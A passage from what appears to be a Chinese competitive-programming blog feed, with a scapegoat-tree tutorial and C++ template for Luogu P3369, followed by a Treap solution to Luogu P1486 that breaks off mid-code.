        <content type="html"><![CDATA[<p>博客咕咕咕了好久……最近会逐步继续恢复更新博客的。<br>最近又在学习二叉搜索树。实测发现替罪羊树快的飞起(时间约Splay的1&#x2F;2)~写起来还比较简单，决定来一波。<br>（那为什么还要用Splay呢？因为Splay是序列之王！还能维护LCT！（你要用非旋Treap（FHQ-Treap）我也没意见））<br>替罪羊树的主要思想就是当出现重量失衡的时候，<strong>把罪魁祸首的那个子树拎出来，重新按最完美的方式（也就是近似完全二叉树）构造一遍再接回去</strong>。<br>如何定义某个子树不平衡：当这个子树的左右子树其中之一的“重量”（节点个数）超过了整个子树的α*100%时，我们认为这个子树不平衡。<br>举例：α&#x3D;0.75时，如果一个子树左子树有4个节点，右子树有1个，这个子树大小就是4+1+1&#x3D;6，左子树占比超过了α*100%（即75%），这个子树不平衡，需要重构。<br>显然，α取值介于0.5至1.0之间，越小树越平衡但重构次数越多，越大重构次数越少但树越不平衡。太大太小都会出事。<strong>一般而言，α取0.75</strong>。如果题目查询次数远大于插入次数，可略微降低α取值（比如α&#x3D;0.70）；若远小于，则略升高（如α&#x3D;0.80）。<br>下面以<a href="https://www.luogu.org/problemnew/show/P3369">洛谷3369【模板】普通平衡树</a>为例：  </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个板子有改进之处：比如删除节点可以打上删除懒标记，单个节点可以记录同一数字数量避免多余节点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf (1&lt;&lt;30)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn (2100000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> db double</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> il inline</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RG register</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> db al=<span class="number">0.75</span>;<span class="comment">//α</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> son[<span class="number">2</span>],fa,size,num;<span class="comment">//左右孩子储存地址，节点父亲，以该节点为根子树的重量，该节点储存的数字</span></span><br><span class="line">&#125; t[maxn];</span><br><span class="line"><span class="type">int</span> n,cnt,root;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">bool</span> <span class="title">balance</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//判断子树是否平衡</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (db)(t[id].size*al&gt;=(db)t[ t[id].son[<span class="number">0</span>] ].size) &amp;&amp; (db)( t[id].size*al&gt;=(db)t[t[ id].son[<span class="number">1</span>] ].size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> cur[maxn],sum;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">recycle</span><span class="params">(RG <span class="type">int</span> id)</span>    <span class="comment">//压扁，把需要重构的子树拎出来先拍扁成序列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">0</span>]) <span class="built_in">recycle</span>(t[id].son[<span class="number">0</span>]);</span><br><span class="line">    cur[++sum]=id;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">1</span>]) <span class="built_in">recycle</span>(t[id].son[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">build</span><span class="params">(RG <span class="type">int</span> l,RG <span class="type">int</span> r)</span>   <span class="comment">//递归建树，使结构最优</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    RG <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>,id=cur[mid];</span><br><span class="line">    t[ t[id].son[<span class="number">0</span>]=<span class="built_in">build</span>(l,mid<span class="number">-1</span>) ].fa=id;</span><br><span class="line">    t[ t[id].son[<span class="number">1</span>]=<span class="built_in">build</span>(mid+<span class="number">1</span>,r) ].fa=id;</span><br><span class="line">    t[id].size=t[ t[id].son[<span class="number">0</span>] ].size+t[ t[id].son[<span class="number">1</span>] ].size+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">rebuild</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//重构子树，再“接回去”</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sum=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">recycle</span>(id);</span><br><span class="line">    RG <span class="type">int</span> fa=t[id].fa,Son=( t[ t[id].fa ].son[<span class="number">1</span>]==id );</span><br><span class="line">    RG <span class="type">int</span> cur=<span class="built_in">build</span>(<span class="number">1</span>,sum);</span><br><span class="line">    t[ t[fa].son[Son]=cur ].fa=fa;</span><br><span class="line">    <span class="keyword">if</span>(id==root) root=cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">insert</span><span class="params">(RG <span class="type">int</span> x)</span><span class="comment">//插入一个数字x</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root,cur=++cnt;</span><br><span class="line">    t[cur].size=<span class="number">1</span>,t[cur].num=x;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123; <span class="comment">//找到适合位置插入</span></span><br><span class="line">        t[now].size++;</span><br><span class="line">        RG <span class="type">bool</span> Son=(x&gt;=t[now].num);</span><br><span class="line">        <span class="keyword">if</span>( t[now].son[Son] ) now=t[now].son[Son];</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            t[ t[now].son[Son]=cur ].fa=now;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RG <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=cur; i; i=t[i].fa) <span class="keyword">if</span>(!<span class="built_in">balance</span>(i)) flag=i;<span class="comment">//注意：重建时取深度最浅的，以避免小子树重构完大子树还重构，浪费时间</span></span><br><span class="line">    <span class="keyword">if</span>(flag) <span class="built_in">rebuild</span>(flag); <span class="comment">//插入往往会导致不平衡,这时需要重建不平衡的子树即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_num</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//查询 x 在树中的节点编号（在数组中储存位置下标）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[now].num==x) <span class="keyword">return</span> now;</span><br><span class="line">        <span class="keyword">else</span> now=t[now].son[ t[now].num&lt;x ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">void</span> <span class="title">erase</span><span class="params">(RG <span class="type">int</span> id)</span>   <span class="comment">//删除</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t[id].son[<span class="number">0</span>] &amp;&amp; t[id].son[<span class="number">1</span>]) &#123;</span><br><span class="line">        RG <span class="type">int</span> cur=t[id].son[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">while</span>(t[cur].son[<span class="number">1</span>]) cur=t[cur].son[<span class="number">1</span>];</span><br><span class="line">        t[id].num=t[cur].num;</span><br><span class="line">        id=cur;</span><br><span class="line">    &#125; <span class="comment">//删除操作需要找到左子树的最后一个节点或右子树的第一个节点来顶替,优先找左子树</span></span><br><span class="line">    RG <span class="type">int</span> Son=(t[id].son[<span class="number">0</span>]) ? t[id].son[<span class="number">0</span>]:t[id].son[<span class="number">1</span>];</span><br><span class="line">    RG <span class="type">int</span> k=( t[ t[id].fa ].son[<span class="number">1</span>]==id );</span><br><span class="line">    t[ t[ t[id].fa ].son[k]=Son ].fa=t[id].fa;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=t[id].fa; i; i=t[i].fa) t[i].size--;</span><br><span class="line">    <span class="keyword">if</span>(id==root) root=Son;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_rank</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//查 x 的排名</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(now) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[now].num&lt;x) ans+=t[ t[now].son[<span class="number">0</span>] ].size+<span class="number">1</span>,now=t[now].son[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span> now=t[now].son[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">il <span class="type">int</span> <span class="title">get_kth</span><span class="params">(RG <span class="type">int</span> x)</span>   <span class="comment">//查树中的第 k 个数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RG <span class="type">int</span> now=root;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(t[ t[now].son[<span class="number">0</span>] ].size==x<span class="number">-1</span>) <span class="keyword">return</span> now;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t[ t[now].son[<span class="number">0</span>] ].size&gt;=x) now=t[now].son[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> x-=t[ t[now].son[<span class="number">0</span>] ].size+<span class="number">1</span>,now=t[now].son[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cnt=<span class="number">2</span>,root=<span class="number">1</span>;</span><br><span class="line">    t[<span class="number">1</span>].num=-inf,t[<span class="number">1</span>].size=<span class="number">2</span>,t[<span class="number">1</span>].son[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    t[<span class="number">2</span>].num=inf,t[<span class="number">2</span>].size=<span class="number">1</span>,t[<span class="number">2</span>].fa=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    RG <span class="type">int</span> type,x;</span><br><span class="line">    <span class="keyword">for</span>(RG <span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;type,&amp;x);</span><br><span class="line">        <span class="keyword">if</span>(type==<span class="number">1</span>) <span class="built_in">insert</span>(x);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">2</span>) <span class="built_in">erase</span>( <span class="built_in">get_num</span>(x) );</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">3</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">get_rank</span>(x));</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">4</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[ <span class="built_in">get_kth</span>(x+<span class="number">1</span>) ].num);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">5</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[<span class="built_in">get_kth</span>(<span class="built_in">get_rank</span>(x))].num);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(type==<span class="number">6</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,t[<span class="built_in">get_kth</span>(<span class="built_in">get_rank</span>(x+<span class="number">1</span>)+<span class="number">1</span>)].num);<span class="comment">//注意此处 </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P1486 [NOI2004]郁闷的出纳员</title>
      <link href="/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20%5BNOI2004%5D%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/"/>
      <url>/2018/04/09/%E6%B4%9B%E8%B0%B7P1486%20%5BNOI2004%5D%E9%83%81%E9%97%B7%E7%9A%84%E5%87%BA%E7%BA%B3%E5%91%98/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="https://www.luogu.org/problemnew/show/P1486">https://www.luogu.org/problemnew/show/P1486</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>一个序列a，初始为空。<br>随时插入一个数，查询第k大，全体加，全体减。<br>但是如果任何数在任何时刻低于给定的下界MIN，则立即移除出序列。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>插入，查询第k大，容易发现是BST题。于是上Treap。<br>全体加全体减暴力加肯定不行，考虑用变量delta储存变化情况。全体加n就是delta+&#x3D;n（n为负就是减）<br>于是每个数实际的值是：树里储存该数的值+delta  ——①<br>减了之后可能会有数低于下界，查找最小的数判断是不是小于MIN，是的话删除，重复直到不再小于MIN。<br>注意新插入的数不应该受之前的加减影响，所以将一个数字num插入树中时，如果直接把num插入树中，就变成num+delta了。<br>实际应该插入的是num-delta，这样结合上文①，现在这个数实际的值就是num本身了。<br>提供一个指针实现的Treap，不推荐使用其实，调的时候快把我搞吐血。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MAXN=<span class="number">200010</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> d,rnd,size;</span><br><span class="line">        Node *ch[<span class="number">2</span>],*pa;</span><br><span class="line">    &#125;pool[MAXN],*root;</span><br><span class="line">    <span class="type">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="function">Node *<span class="title">newnode</span><span class="params">(<span class="type">int</span> d)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Node *p=&amp;pool[++tot];</span><br><span class="line">        p-&gt;d=d;p-&gt;rnd=<span class="built_in">rand</span>();p-&gt;size=<span class="number">1</span>;</span><br><span class="line">        p-&gt;ch[<span class="number">0</span>]=p-&gt;ch[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">size</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p?p-&gt;size:<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        p-&gt;size=<span class="built_in">size</span>(p-&gt;ch[<span class="number">0</span>])+<span class="built_in">size</span>(p-&gt;ch[<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(Node *p,<span class="type">int</span> t)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Node *pa=p-&gt;pa,*gp=pa-&gt;pa,*son=p-&gt;ch[t^<span class="number">1</span>];</span><br><span class="line">        pa-&gt;ch[t]=son;</span><br><span class="line">        <span class="keyword">if</span>(son)son-&gt;pa=pa;</span><br><span class="line">        <span class="keyword">if</span>(gp)gp-&gt;ch[pa==gp-&gt;ch[<span class="number">1</span>]]=p;</span><br><span class="line">        p-&gt;pa=gp;</span><br><span class="line">        p-&gt;ch[t^<span class="number">1</span>]=pa;</span><br><span class="line">        pa-&gt;pa=p;</span><br><span class="line">        <span class="keyword">if</span>(pa==root)root=p;</span><br><span class="line">        <span class="built_in">update</span>(pa);</span><br><span class="line">        <span class="built_in">update</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">treap</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p==root || p-&gt;rnd &gt;= p-&gt;pa-&gt;rnd)<span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">rotate</span>(p,p==p-&gt;pa-&gt;ch[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(Node *r,Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!r)</span><br><span class="line">        &#123;</span><br><span class="line">            root=p;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> f=(p-&gt;d &gt;= r-&gt;d);</span><br><span class="line">        <span class="keyword">if</span>(!r-&gt;ch[f])</span><br><span class="line">        &#123;</span><br><span class="line">            r-&gt;ch[f]=p;</span><br><span class="line">            p-&gt;pa=r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">insert</span>(r-&gt;ch[f],p);</span><br><span class="line">        <span class="built_in">update</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Node* <span class="title">find</span><span class="params">(Node *r,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>]))<span class="keyword">return</span> <span class="built_in">find</span>(r-&gt;ch[<span class="number">0</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])+<span class="number">1</span>)<span class="keyword">return</span> r;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(r-&gt;ch[<span class="number">1</span>],x-<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;ch[<span class="number">0</span>] &amp;&amp; !p-&gt;ch[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p==root)</span><br><span class="line">            &#123;</span><br><span class="line">                root=<span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Node *pa=p-&gt;pa;</span><br><span class="line">            <span class="keyword">if</span>(pa)</span><br><span class="line">                pa-&gt;ch[p==pa-&gt;ch[<span class="number">1</span>]]=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">while</span>(p!=root)</span><br><span class="line">                <span class="built_in">update</span>(p=p-&gt;pa);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;ch[<span class="number">0</span>] &amp;&amp; p-&gt;ch[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> f=(p-&gt;ch[<span class="number">1</span>]-&gt;rnd &lt; p-&gt;ch[<span class="number">0</span>]-&gt;rnd);</span><br><span class="line">            <span class="built_in">rotate</span>(p-&gt;ch[f],f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;ch[<span class="number">0</span>])f=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">rotate</span>(p-&gt;ch[f],f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">del</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">kth</span><span class="params">(Node *r,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>]))<span class="keyword">return</span> <span class="built_in">kth</span>(r-&gt;ch[<span class="number">0</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])+<span class="number">1</span>)<span class="keyword">return</span> r-&gt;d;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kth</span>(r-&gt;ch[<span class="number">1</span>],x-<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span> <span class="title">getUpper</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">while</span>(c=<span class="built_in">getchar</span>())</span><br><span class="line">            